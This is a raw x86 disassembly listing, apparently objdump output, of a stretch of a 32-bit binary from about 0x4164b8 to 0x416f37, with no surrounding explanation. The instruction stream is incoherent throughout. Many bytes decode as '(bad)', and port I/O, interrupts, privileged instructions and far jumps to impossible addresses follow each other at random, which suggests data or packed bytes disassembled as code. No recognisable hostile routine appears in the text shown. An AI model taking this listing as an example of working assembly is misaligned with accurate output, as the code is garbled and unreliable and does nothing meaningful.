  4164b8:	and    DWORD PTR [eax+ebx*4-0x6115f878],esi
  4164bf:	dec    ebx
  4164c0:	xchg   ebp,eax
  4164c1:	jle    0x416535
  4164c3:	cmp    esp,edi
  4164c5:	push   esp
  4164c6:	xchg   ebx,eax
  4164c7:	inc    ebx
  4164c9:	jbe    0x4164ca
  4164cb:	dec    esp
  4164cc:	lock sub al,0x19
  4164cf:	cmp    DWORD PTR [edx],ebx
  4164d1:	in     eax,dx
  4164d2:	icebp  
  4164d3:	add    cl,0xa4
  4164d6:	sbb    ecx,DWORD PTR [edi+ebp*2]
  4164d9:	cdq    
  4164da:	ja     0x416499
  4164dc:	sub    dh,BYTE PTR [eax+0x407cd990]
  4164e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164e3:	bound  eax,QWORD PTR [ebp+esi*1-0x59f5a2f6]
  4164ea:	xor    al,0xae
  4164ec:	in     al,0xd5
  4164ee:	adc    al,0x43
  4164f0:	aam    0xe4
  4164f2:	mov    DWORD PTR [ebx-0x346aa13e],ebp
  4164f8:	fs jns 0x41650b
  4164fb:	bound  eax,QWORD PTR [ebx]
  4164fd:	daa    
  4164fe:	cmp    eax,ebx
  416500:	xor    BYTE PTR [eax],ah
  416502:	add    edx,DWORD PTR [edx+0x676e79b9]
  416508:	out    dx,eax
  416509:	in     eax,dx
  41650a:	sbb    eax,0xaec92431
  41650f:	inc    eax
  416510:	pop    es
  416511:	out    dx,al
  416512:	leave  
  416513:	fwait
  416514:	mov    al,ds:0x2f47706d
  416519:	inc    ebp
  41651a:	push   eax
  41651b:	fmul   st(2),st
  41651d:	stc    
  41651e:	fdivr  st(4),st
  416520:	mov    ebx,0xd8642778
  416525:	not    DWORD PTR [ecx-0x13]
  416528:	pop    ebx
  416529:	iret   
  41652a:	nop
  41652b:	push   DWORD PTR [esi+0x2f356b84]
  416531:	ret    0x5c70
  416534:	in     eax,dx
  416535:	int    0x0
  416537:	ss mov al,0x63
  41653a:	push   ss
  41653b:	pop    ss
  41653c:	test   eax,0x7a769565
  416541:	push   esp
  416542:	scas   eax,DWORD PTR es:[edi]
  416543:	pop    edi
  416544:	xor    al,0xb6
  416546:	and    bl,ah
  416548:	mov    esi,0xc709bf6b
  41654d:	add    eax,0x935d045f
  416552:	popf   
  416553:	call   0x94ff303d
  416558:	sbb    DWORD PTR [ebp-0x3c],ebx
  41655b:	rol    BYTE PTR [eax],1
  41655d:	sti    
  41655e:	mov    BYTE PTR [esi+0x14],bh
  416561:	xor    bh,BYTE PTR [ecx-0x5b9df74f]
  416567:	and    DWORD PTR [ecx],esi
  416569:	push   cs
  41656a:	add    eax,DWORD PTR [esi+esi*2-0x262c6ee1]
  416571:	mov    eax,0x15a179ed
  416576:	sbb    eax,0x1e4b06c3
  41657b:	sbb    BYTE PTR [esi],bh
  41657d:	outs   dx,BYTE PTR ds:[esi]
  41657e:	jmp    0x4165c3
  416580:	clc    
  416581:	and    esi,edi
  416583:	jle    0x4165a1
  416585:	fwait
  416586:	mov    ebx,0x605d8cc5
  41658b:	clc    
  41658c:	aam    0x25
  41658e:	loopne 0x416560
  416590:	jnp    0x416592
	...
  4165f2:	add    BYTE PTR [eax],al
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x654fbcac]
  416601:	shl    DWORD PTR [edx*2+0xec5e],cl
  416608:	add    eax,0xda000001
  41660d:	imul   ecx,DWORD PTR [ecx+esi*8+0x6f],0x87c43864
  416615:	or     eax,0x5df756d0
  41661a:	repnz mov ds:0xbe7b0d12,eax
  416620:	sbb    eax,0x80363c24
  416625:	test   BYTE PTR [esi],dl
  416627:	pop    ds
  416628:	jbe    0x4165d0
  41662a:	mov    bh,0xd2
  41662c:	out    0x36,eax
  41662e:	jb     0x416622
  416630:	cli    
  416631:	stc    
  416632:	lahf   
  416633:	sbb    BYTE PTR [eax+0x2d35011f],cl
  416639:	sbb    ecx,DWORD PTR [esi+esi*8]
  41663c:	int    0xd4
  41663e:	ins    DWORD PTR es:[edi],dx
  41663f:	dec    ebx
  416640:	mov    DWORD PTR [esi+0x38e874e8],ebp
  416646:	push   cs
  416647:	or     dh,bl
  416649:	(bad)  
  41664a:	icebp  
  41664b:	push   0xffffffbb
  41664d:	outs   dx,BYTE PTR ds:[esi]
  41664e:	into   
  41664f:	and    DWORD PTR [esi-0x5f],edx
  416652:	jno    0x41662d
  416654:	mov    ebx,ebx
  416656:	mov    al,ds:0xc2c033de
  41665b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41665c:	xchg   ebx,esp
  41665e:	int3   
  41665f:	pop    es
  416660:	add    dh,BYTE PTR [edi]
  416662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416663:	jbe    0x41663b
  416665:	adc    DWORD PTR [ebp+0x10],ecx
  416668:	pop    edx
  416669:	add    eax,0x1b5a08d5
  41666e:	cwde   
  41666f:	(bad)  
  416670:	jns    0x416698
  416672:	in     eax,dx
  416673:	add    edi,edx
  416675:	mov    al,ds:0xf5ee7169
  41667a:	cmc    
  41667b:	into   
  41667c:	rol    DWORD PTR [ecx],cl
  41667e:	lods   eax,DWORD PTR ds:[esi]
  41667f:	jg     0x41666f
  416681:	fwait
  416682:	xchg   edx,eax
  416683:	neg    BYTE PTR [esi-0x7c69a8ab]
  416689:	or     edx,edx
  41668b:	cmp    BYTE PTR [edx-0x2acfe78],dl
  416691:	jge    0x41661d
  416693:	adc    eax,0x7b9bd6eb
  416698:	xchg   ecx,eax
  416699:	jmp    0x4166db
  41669b:	dec    ebx
  41669c:	pop    esi
  41669d:	sub    bl,BYTE PTR [esi+0x6580ab78]
  4166a3:	cli    
  4166a4:	iret   
  4166a5:	mov    edx,0x6e3dc777
  4166aa:	enter  0x9800,0x1b
  4166ae:	in     al,dx
  4166af:	dec    ebp
  4166b0:	ja     0x416705
  4166b2:	aam    0xeb
  4166b4:	xor    cl,BYTE PTR [eax]
  4166b6:	or     ebp,edx
  4166b8:	mov    al,0xcf
  4166ba:	mov    ecx,gs
  4166bc:	sbb    BYTE PTR [ebx],0xc4
  4166bf:	int    0xee
  4166c1:	inc    ecx
  4166c2:	inc    esp
  4166c3:	in     eax,dx
  4166c4:	add    esp,DWORD PTR [ebx-0x75]
  4166c7:	lahf   
  4166c8:	outs   dx,BYTE PTR ds:[esi]
  4166c9:	js     0x4166cc
  4166cb:	clc    
  4166cc:	and    BYTE PTR [esi+edi*8+0xbb93951],dh
  4166d3:	adc    dl,BYTE PTR [ecx-0x2f942ada]
  4166d9:	jl     0x4166d3
  4166db:	arpl   di,si
  4166dd:	rol    BYTE PTR [edi-0x2db860b5],0x15
  4166e4:	out    dx,eax
  4166e5:	mov    esp,0x15749aee
  4166ea:	fldenv [ebp+0x60c6dccc]
  4166f0:	cmp    dh,dh
  4166f2:	rcl    DWORD PTR [ebx],0x97
  4166f5:	stos   BYTE PTR es:[edi],al
  4166f6:	inc    esp
  4166f7:	popf   
  4166f8:	push   ebx
  4166f9:	mov    al,BYTE PTR [edx+0x252b3a3d]
  4166ff:	sub    BYTE PTR [eax],dl
  416701:	xor    BYTE PTR [esi-0x101267c5],dh
  416707:	add    DWORD PTR [ebp-0x265bef4c],edx
  41670d:	xor    bl,BYTE PTR [esi]
  41670f:	scas   al,BYTE PTR es:[edi]
  416710:	cmp    eax,DWORD PTR [eax]
	...
  416772:	add    BYTE PTR [eax],al
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	mov    esi,0x632b946f
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x9b000001
  41678d:	mov    bh,0x1c
  41678f:	push   ds
  416790:	fldcw  WORD PTR [ebp+0x57]
  416793:	sub    al,0xc3
  416795:	push   ebx
  416796:	dec    bx
  416798:	mov    ds:0x19821fab,al
  41679d:	and    al,0x39
  41679f:	test   esi,0x72b43e6d
  4167a5:	mov    ebx,0x73924a02
  4167aa:	in     al,0xf4
  4167ac:	adc    esp,DWORD PTR [ebx+0x5b]
  4167af:	(bad)  
  4167b0:	sub    eax,0x2d4e5b0f
  4167b5:	inc    esp
  4167b6:	test   DWORD PTR [esi-0x610256ad],0x86af133d
  4167c0:	and    DWORD PTR ds:0x69edd5b9,ebx
  4167c6:	mov    esi,0xfe20059c
  4167cb:	cmc    
  4167cc:	mul    BYTE PTR [ebx-0x5cf34f95]
  4167d2:	pop    edi
  4167d3:	dec    edx
  4167d4:	jae    0x4167d0
  4167d6:	mov    cl,0x8f
  4167d8:	dec    ebx
  4167d9:	dec    eax
  4167da:	mov    esi,0xfac7030b
  4167df:	jmp    0xe784:0x6b7fb07a
  4167e6:	jbe    0x416861
  4167e8:	imul   esp,DWORD PTR [ecx+0x4075769e],0x993eeb04
  4167f2:	loop   0x4167ef
  4167f4:	loope  0x4167b5
  4167f6:	sub    dh,BYTE PTR [esi+0x49]
  4167f9:	ins    DWORD PTR es:[edi],dx
  4167fa:	call   0x958171d7
  4167ff:	cmp    al,0xc0
  416801:	sub    eax,DWORD PTR [ebx+0x69]
  416804:	lock (bad) 
  416806:	fimul  WORD PTR [esi-0x34d883b1]
  41680c:	(bad)  
  41680d:	leave  
  41680e:	fdiv   DWORD PTR [edx+0x13456204]
  416814:	sub    ebx,DWORD PTR [edx]
  416816:	popa   
  416817:	and    ebx,DWORD PTR [ebx-0x767c5923]
  41681d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41681e:	rol    DWORD PTR [edx],0x46
  416821:	dec    esi
  416822:	hlt    
  416823:	mov    dh,0x48
  416825:	jne    0x4167fa
  416827:	jecxz  0x4167e6
  416829:	inc    edx
  41682a:	cmc    
  41682b:	dec    ax
  41682d:	dec    esi
  41682e:	fimul  WORD PTR [esi-0x1a]
  416831:	(bad)  
  416832:	test   BYTE PTR [esi+0x7a011849],0x3f
  416839:	retf   
  41683a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41683b:	jae    0x416888
  41683d:	inc    edi
  41683e:	imul   eax,DWORD PTR [edx+0x6f090c87],0x28
  416845:	lods   al,BYTE PTR ds:[esi]
  416846:	call   0xa2f9:0x84a80e77
  41684d:	imul   ebx,DWORD PTR [ecx],0x80baa8fd
  416853:	xor    DWORD PTR [eax+0x533da197],eax
  416859:	jns    0x416895
  41685b:	add    esp,esp
  41685d:	pop    edi
  41685e:	(bad)  
  41685f:	adc    BYTE PTR [esi],0x29
  416862:	push   ss
  416863:	fist   DWORD PTR [ebx-0x16446369]
  416869:	sub    ebx,DWORD PTR [edi]
  41686b:	sbb    BYTE PTR ds:0x5e5baca4,al
  416871:	data16 into 
  416873:	sub    eax,edx
  416875:	mov    al,ds:0xab7fc6b
  41687a:	cmp    edi,ecx
  41687c:	mov    cl,0x86
  41687e:	ins    BYTE PTR es:[edi],dx
  41687f:	scas   al,BYTE PTR es:[edi]
  416880:	cmc    
  416881:	(bad)  
  416883:	das    
  416884:	es xchg esp,eax
  416886:	test   eax,0xeac8c8d9
  41688b:	pop    es
  41688c:	push   esp
  41688d:	js     0x416891
  41688f:	mov    esi,0x4d
	...
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xdf1faa43
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    BYTE PTR [edi+0x6095581e],bl
  416911:	and    edx,DWORD PTR [eax]
  416913:	out    dx,al
  416914:	sbb    DWORD PTR [esi],ebx
  416916:	mov    dl,0x30
  416918:	out    0x56,eax
  41691a:	hlt    
  41691b:	cmp    edx,edx
  41691d:	pop    ebx
  41691e:	dec    ebp
  41691f:	xchg   edi,eax
  416920:	push   cs
  416921:	icebp  
  416922:	adc    DWORD PTR [ebx+0x58711f43],0x755ffd61
  41692c:	adc    BYTE PTR [ebx-0x34],al
  41692f:	inc    edi
  416930:	dec    esi
  416931:	bound  edi,QWORD PTR [ebx+ecx*4-0x7]
  416935:	repnz cmp DWORD PTR [ecx],ecx
  416938:	mov    dh,0xfb
  41693a:	mov    DWORD PTR [esi-0x5f3f93aa],esi
  416940:	outs   dx,DWORD PTR ds:[esi]
  416941:	bound  ebx,QWORD PTR [esp+ecx*1+0x4ab1c471]
  416948:	mov    edi,0x48938c1a
  41694d:	jmp    0xde3d0ac0
  416952:	pushf  
  416953:	mov    ds:0xf20b2c8b,eax
  416958:	sbb    BYTE PTR ds:0xba753913,0xb2
  41695f:	mov    edi,0xe21a38e1
  416964:	imul   DWORD PTR [edi-0x7fd00152]
  41696a:	dec    ecx
  41696b:	cwde   
  41696c:	fdiv   st(4),st
  41696e:	or     DWORD PTR [eax-0xdea5ea5],ebp
  416974:	mov    eax,ds:0x267c0d24
  416979:	dec    esp
  41697a:	pop    ecx
  41697b:	pop    esp
  41697c:	mov    esp,0xa9c8e36f
  416981:	inc    eax
  416982:	into   
  416983:	cld    
  416984:	test   eax,0xc396b9e5
  416989:	neg    bl
  41698b:	repnz ss xchg edx,eax
  41698e:	jge    0x416992
  416990:	jmp    0xa1a5984c
  416995:	loop   0x41697f
  416997:	fwait
  416998:	sub    DWORD PTR [esi-0x4d],edi
  41699b:	ins    DWORD PTR es:[edi],dx
  41699c:	inc    ebp
  41699d:	push   ss
  41699e:	outs   dx,BYTE PTR ds:[esi]
  41699f:	jecxz  0x41693c
  4169a1:	lods   al,BYTE PTR ds:[esi]
  4169a2:	dec    eax
  4169a3:	clc    
  4169a4:	push   cs
  4169a5:	jnp    0x416a03
  4169a7:	ret    0x7608
  4169aa:	test   eax,0x5a913de9
  4169af:	inc    ecx
  4169b0:	fstp   DWORD PTR [eax-0x18e5b8bd]
  4169b6:	add    eax,edx
  4169b8:	mov    cl,BYTE PTR [ecx-0x7f]
  4169bb:	lods   eax,DWORD PTR ds:[esi]
  4169bc:	xchg   esi,eax
  4169bd:	jle    0x416a30
  4169bf:	sub    eax,0x559352a9
  4169c4:	and    BYTE PTR [ebx-0x2988e8d3],cl
  4169ca:	push   ecx
  4169cb:	mov    ebp,0x92e89a4a
  4169d0:	out    0xda,eax
  4169d2:	shr    DWORD PTR cs:[eax-0x11],cl
  4169d6:	idiv   ah
  4169d8:	jle    0x4169aa
  4169da:	popa   
  4169db:	mov    al,BYTE PTR [edi]
  4169dd:	xchg   edx,eax
  4169de:	out    dx,eax
  4169df:	loope  0x416a08
  4169e1:	call   0x6843fc41
  4169e6:	add    eax,0x450e40b1
  4169eb:	mov    ch,0x43
  4169ed:	push   0xffffffbd
  4169ef:	test   eax,0x2c4802cc
  4169f4:	jbe    0x4169bd
  4169f6:	ins    DWORD PTR es:[edi],dx
  4169f7:	push   esp
  4169f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169f9:	repnz repz pop sp
  4169fd:	inc    esp
  4169fe:	inc    DWORD PTR [eax+0x779c0d67]
  416a04:	pop    ss
  416a05:	ss jle 0x416a13
  416a08:	and    ah,0xce
  416a0b:	ficomp DWORD PTR [esi]
  416a0d:	aas    
  416a0e:	xlat   BYTE PTR ds:[ebx]
  416a0f:	out    dx,al
  416a10:	fadd   DWORD PTR [eax]
	...
  416a72:	add    BYTE PTR [eax],al
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xd2e60ba3
  416a82:	push   ds
  416a83:	xchg   ebp,eax
  416a84:	ins    DWORD PTR es:[edi],dx
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0x2000001
  416a8d:	loope  0x416a41
  416a8f:	rcl    BYTE PTR [esp+ebx*8],cl
  416a92:	aam    0x26
  416a94:	lods   eax,DWORD PTR ds:[esi]
  416a95:	sar    DWORD PTR [ebp+0x501b8de9],1
  416a9b:	and    DWORD PTR [esi],edi
  416a9d:	dec    eax
  416a9e:	jmp    0xe317:0x6b131f9c
  416aa5:	mov    al,0x5a
  416aa7:	jecxz  0x416adc
  416aa9:	pop    esp
  416aaa:	imul   ecx,DWORD PTR [edi+0x4bd9f217],0x69c83c7c
  416ab4:	ins    BYTE PTR es:[edi],dx
  416ab5:	pop    ebx
  416ab6:	jecxz  0x416a3e
  416ab8:	sub    eax,0x8fe5cc8b
  416abd:	dec    ecx
  416abe:	push   ebp
  416abf:	push   DWORD PTR [ebp+edx*2+0xb]
  416ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ac4:	into   
  416ac5:	scas   al,BYTE PTR es:[edi]
  416ac6:	fmul   st(7),st
  416ac8:	pusha  
  416ac9:	add    cl,BYTE PTR ds:0xef50dfb2
  416acf:	sar    DWORD PTR [edi],1
  416ad1:	mov    dl,0xf3
  416ad3:	arpl   WORD PTR [esi+0x34],si
  416ad6:	jecxz  0x416abd
  416ad8:	sub    BYTE PTR [ebx],ch
  416ada:	ficomp WORD PTR [esp-0x4b]
  416ade:	sub    DWORD PTR [edi+0xd],edx
  416ae1:	jo     0x416ac7
  416ae3:	pop    edi
  416ae4:	ja     0x416a70
  416ae6:	fs xchg edi,eax
  416ae8:	pop    ebp
  416ae9:	jmp    0x594b6259
  416aee:	jle    0x416b65
  416af0:	cli    
  416af1:	xor    edi,ecx
  416af3:	loop   0x416afa
  416af5:	popf   
  416af6:	mov    ds:0xc19b234b,eax
  416afb:	ficomp WORD PTR [esi+0x2c434d13]
  416b01:	adc    al,0xaa
  416b03:	jge    0x416b34
  416b05:	in     eax,0x2f
  416b07:	out    dx,al
  416b08:	jl     0x416a90
  416b0a:	sbb    al,0x71
  416b0c:	adc    bh,cl
  416b0e:	in     al,0xfd
  416b10:	ins    DWORD PTR es:[edi],dx
  416b11:	popa   
  416b12:	fucomip st,st(1)
  416b15:	ret    
  416b16:	test   al,0x57
  416b18:	fstp   DWORD PTR [ecx+0x62]
  416b1b:	addr16 (bad) 
  416b1d:	mov    ecx,0xf3fc1a05
  416b22:	imul   esi,esi,0x66b8b7f5
  416b28:	jns    0x416b09
  416b2a:	xor    al,0x2a
  416b2c:	pusha  
  416b2d:	lea    ebp,[edi]
  416b2f:	xchg   BYTE PTR ds:0x28355aae,al
  416b35:	(bad)  
  416b37:	imul   esi,DWORD PTR [ebx+0x4a],0x61
  416b3b:	retf   
  416b3c:	shr    DWORD PTR [edx+0x2c577fc3],cl
  416b42:	or     BYTE PTR [ecx-0x47b0dca3],ch
  416b48:	hlt    
  416b49:	out    dx,eax
  416b4a:	stc    
  416b4b:	fdiv   QWORD PTR [edx+0xef31e53]
  416b51:	(bad)  
  416b52:	fisttp QWORD PTR [ebx+0x16f2cd36]
  416b58:	loop   0x416bd8
  416b5a:	cmp    BYTE PTR [esi],al
  416b5c:	enter  0xa757,0xd
  416b60:	dec    ecx
  416b61:	mov    eax,0x2a71705c
  416b66:	jb     0x416b23
  416b68:	inc    eax
  416b69:	jecxz  0x416b64
  416b6b:	cvtps2pd xmm5,xmm1
  416b6e:	mov    gs,WORD PTR [eax+0xa]
  416b71:	pop    es
  416b72:	adc    esp,DWORD PTR [ecx]
  416b74:	int    0x51
  416b76:	(bad)  
  416b77:	js     0x416b59
  416b79:	cmp    DWORD PTR [ebx+0x24fe3bb9],esp
  416b7f:	loopne 0x416b80
  416b81:	rol    BYTE PTR [ecx+0x17c94f1],cl
  416b87:	mov    bh,0xf6
  416b89:	mov    ah,BYTE PTR [ebx-0x745008f7]
  416b8f:	add    esp,DWORD PTR [ebp+0x0]
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x7e5b70a9
  416c01:	cmp    al,0xe1
  416c03:	dec    esp
  416c04:	jb     0x416bf6
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    eax,0xd4000001
  416c0d:	xor    BYTE PTR [edx-0x79],0x96
  416c11:	outs   dx,DWORD PTR ds:[esi]
  416c12:	mov    DWORD PTR [edx-0x61],ebp
  416c15:	test   DWORD PTR [edx],0x225936ad
  416c1b:	out    0x13,eax
  416c1d:	pushf  
  416c1e:	xchg   ebp,eax
  416c1f:	xor    eax,0xb173eed4
  416c24:	sbb    eax,0xc3f8e230
  416c29:	(bad)  
  416c2a:	rol    DWORD PTR ds:0xc34013ff,1
  416c30:	fcomp  DWORD PTR [edx+0xb]
  416c33:	retf   
  416c34:	jb     0x416c7c
  416c36:	xchg   edx,eax
  416c37:	sub    dh,BYTE PTR [ebp-0x31]
  416c3a:	stos   BYTE PTR es:[edi],al
  416c3b:	push   ebp
  416c3c:	dec    ecx
  416c3d:	das    
  416c3e:	xor    BYTE PTR [eax+0x57011190],0xf2
  416c45:	push   ebx
  416c46:	mov    ecx,0x1dfe337f
  416c4b:	adc    eax,0x26080dcf
  416c50:	mov    edi,0x9ff18baf
  416c55:	cld    
  416c56:	(bad)  
  416c57:	mov    edi,0x84a727d6
  416c5c:	adc    al,0x86
  416c5e:	push   es
  416c5f:	pushf  
  416c60:	jae    0x416cd2
  416c62:	pop    edi
  416c63:	cld    
  416c64:	cld    
  416c65:	jae    0x416c16
  416c67:	sahf   
  416c68:	ds cwde 
  416c6a:	lahf   
  416c6b:	lock mov dh,0xa5
  416c6e:	ins    DWORD PTR es:[edi],dx
  416c6f:	cmp    dh,cl
  416c71:	cwde   
  416c72:	out    0xf5,al
  416c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c75:	mov    dl,0xb1
  416c77:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  416c79:	or     BYTE PTR ds:0xc4249514,bh
  416c80:	mov    al,ds:0x1158cfe3
  416c85:	jmp    0x416c7a
  416c87:	stos   BYTE PTR es:[edi],al
  416c88:	sub    BYTE PTR [eax+ebp*4-0x520d7b70],bl
  416c8f:	mov    esp,DWORD PTR [eax-0x75]
  416c92:	outs   dx,DWORD PTR ds:[esi]
  416c93:	lods   al,BYTE PTR ds:[esi]
  416c94:	sbb    DWORD PTR [ebx],eax
  416c96:	and    al,0xad
  416c98:	js     0x416cbd
  416c9a:	cmp    eax,0xa3f175b
  416c9f:	push   es
  416ca0:	pop    edi
  416ca1:	push   cs
  416ca2:	push   ebx
  416ca3:	fadd   st(0),st
  416ca5:	sub    eax,0x412a1a2
  416caa:	mov    eax,ds:0x875d985d
  416caf:	dec    ecx
  416cb0:	out    dx,eax
  416cb1:	dec    edx
  416cb2:	(bad)  
  416cb3:	mov    ebx,0x9df2d108
  416cb8:	(bad)  
  416cb9:	out    dx,eax
  416cba:	test   DWORD PTR [ebp+0x15],ebx
  416cbd:	outs   dx,DWORD PTR ds:[esi]
  416cbe:	pop    edi
  416cbf:	mov    bh,0x58
  416cc1:	arpl   WORD PTR ds:0x1264989a,sp
  416cc7:	fwait
  416cc8:	add    al,BYTE PTR [ebx-0x58]
  416ccb:	adc    cl,ch
  416ccd:	pop    ss
  416cce:	out    0xbf,al
  416cd0:	(bad)  
  416cd3:	(bad)  
  416cd4:	fistp  WORD PTR [ecx-0xa]
  416cd7:	inc    edi
  416cd8:	(bad)  
  416cd9:	or     al,0x75
  416cdb:	xchg   esi,eax
  416cdc:	sbb    eax,0xaa9dd8b0
  416ce1:	push   ss
  416ce2:	(bad)  
  416ce3:	(bad)  
  416ce4:	nop
  416ce5:	shr    DWORD PTR [esi-0x39],cl
  416ce8:	adc    esi,DWORD PTR [edx]
  416cea:	xchg   BYTE PTR [ecx+0x6173c71d],dl
  416cf0:	in     al,0x3e
  416cf2:	cli    
  416cf3:	push   edx
  416cf4:	int    0x27
  416cf6:	cmp    esp,DWORD PTR [eax]
  416cf8:	or     eax,0x7d7ba5e4
  416cfd:	push   eax
  416cfe:	adc    DWORD PTR [edi],ebx
  416d00:	popa   
  416d01:	add    eax,0x1b216a72
  416d06:	and    eax,0xd8a7ce08
  416d0b:	test   al,0xf2
  416d0d:	sbb    BYTE PTR ds:0x2fc1,bl
	...
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	punpcklwd mm6,DWORD PTR [ebp+0xf1778d]
  416d87:	add    BYTE PTR ds:0x70000001,al
  416d8d:	and    BYTE PTR [eax],bh
  416d8f:	popa   
  416d90:	push   edx
  416d91:	or     DWORD PTR [esi],edi
  416d93:	push   ecx
  416d94:	and    al,0x4a
  416d96:	je     0x416d8a
  416d98:	or     ecx,DWORD PTR [eax]
  416d9a:	jae    0x416d9e
  416d9c:	add    ch,BYTE PTR [eax-0x5ffe35f0]
  416da2:	lahf   
  416da3:	add    DWORD PTR [esp+ecx*4-0x79a1f014],edx
  416daa:	push   edx
  416dab:	pop    DWORD PTR [ebp+0x3267dbed]
  416db1:	mov    ch,BYTE PTR [edx+edi*4+0x68]
  416db5:	call   ebx
  416db7:	add    esi,DWORD PTR [ebx+esi*2+0x5a]
  416dbb:	repz push 0x8097a593
  416dc1:	(bad)  
  416dc2:	xlat   BYTE PTR ds:[ebx]
  416dc3:	cld    
  416dc4:	adc    eax,0x4fb12be2
  416dc9:	xchg   ebx,eax
  416dca:	add    ecx,0x5d
  416dcd:	pop    ss
  416dce:	sar    DWORD PTR [eax],cl
  416dd0:	lea    eax,[edx]
  416dd2:	mov    ss,esi
  416dd4:	pop    eax
  416dd5:	mov    edi,0x2002ca43
  416dda:	retf   
  416ddb:	push   esp
  416ddc:	ins    DWORD PTR es:[edi],dx
  416ddd:	out    dx,al
  416dde:	sbb    bl,bl
  416de0:	aaa    
  416de1:	mov    eax,ds:0xab6cf6d
  416de6:	fs in  eax,dx
  416de8:	xchg   esp,eax
  416de9:	pop    eax
  416dea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416deb:	out    dx,al
  416dec:	aas    
  416ded:	(bad)  
  416def:	pop    eax
  416df0:	mov    ecx,0x6917aca4
  416df5:	and    al,0x6b
  416df7:	jbe    0x416e31
  416df9:	je     0x416e11
  416dfb:	pmaxub mm1,mm7
  416dfe:	push   ebp
  416dff:	fnsave [esi-0x77]
  416e02:	bound  edx,QWORD PTR [eax]
  416e04:	pop    edi
  416e05:	loop   0x416dc3
  416e07:	push   esp
  416e08:	sub    DWORD PTR [edx-0x5e962540],esp
  416e0e:	adc    eax,0xd378b6ca
  416e13:	mov    al,bh
  416e15:	mov    fs,esp
  416e17:	fs mov bh,0x58
  416e1a:	test   BYTE PTR ds:0x61d480cd,0x12
  416e21:	jo     0x416dea
  416e23:	inc    edx
  416e24:	(bad)  
  416e25:	push   es
  416e26:	mov    cl,0x1a
  416e28:	xor    edx,DWORD PTR [eax]
  416e2a:	int    0xfd
  416e2c:	fxch   st(5)
  416e2e:	and    BYTE PTR [eax-0x1],dl
  416e31:	push   ds
  416e32:	(bad)  
  416e33:	fsub   DWORD PTR [esi+0x67bd7a4d]
  416e39:	mov    ds:0x45902231,eax
  416e3e:	push   ds
  416e3f:	xchg   esp,eax
  416e40:	cmp    eax,0xd4de964a
  416e45:	hlt    
  416e46:	outs   dx,BYTE PTR ds:[esi]
  416e47:	pop    ss
  416e48:	cmp    DWORD PTR [edi],edx
  416e4a:	mov    eax,ds:0x13f990ed
  416e4f:	xchg   esp,eax
  416e50:	dec    ebp
  416e51:	dec    edi
  416e52:	and    ebp,DWORD PTR [edi+0x33]
  416e55:	xchg   ebx,eax
  416e56:	stos   BYTE PTR es:[edi],al
  416e57:	mov    ebx,0x390088b4
  416e5c:	(bad)  
  416e5f:	pop    ecx
  416e60:	in     al,0x2c
  416e62:	inc    esp
  416e63:	or     dl,ah
  416e65:	cmp    al,0x83
  416e67:	pop    ebx
  416e68:	inc    eax
  416e69:	sub    ah,ch
  416e6b:	mov    ?,eax
  416e6d:	fsubp  st(0),st
  416e6f:	je     0x416eb6
  416e71:	xchg   esp,eax
  416e72:	fsubp  st(1),st
  416e74:	fstp   TBYTE PTR [esi]
  416e76:	and    BYTE PTR [ebx-0x38],ah
  416e79:	jmp    FWORD PTR [eax-0x31]
  416e7c:	cld    
  416e7d:	sub    esp,DWORD PTR [edi]
  416e7f:	repz sub eax,0x70813040
  416e85:	cmp    al,0xaf
  416e87:	js     0x416e15
  416e89:	push   esi
  416e8a:	out    0xd7,eax
  416e8c:	pushf  
  416e8d:	mov    bl,0x1a
  416e8f:	inc    ebp
  416e90:	popa   
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xdda18eea
  416f02:	ja     0x416e89
  416f04:	jl     0x416ef8
  416f06:	add    BYTE PTR [eax],al
  416f08:	add    eax,0x30000001
  416f0d:	ret    0x6a1b
  416f10:	mov    WORD PTR [edx],ds
  416f12:	into   
  416f13:	ret    0xe8c4
  416f16:	stos   BYTE PTR es:[edi],al
  416f17:	shr    esi,1
  416f19:	rcr    BYTE PTR [edx],0xad
  416f1c:	ins    BYTE PTR es:[edi],dx
  416f1d:	div    DWORD PTR [edi-0x26]
  416f20:	cdq    
  416f21:	push   eax
  416f22:	mov    edx,0x35c5ef0d
  416f27:	cli    
  416f28:	(bad)  
  416f29:	jmp    0x3b72:0x57977af7
  416f30:	loop   0x416eb8
  416f32:	call   0x2e2b4ee5
  416f37:	popf   
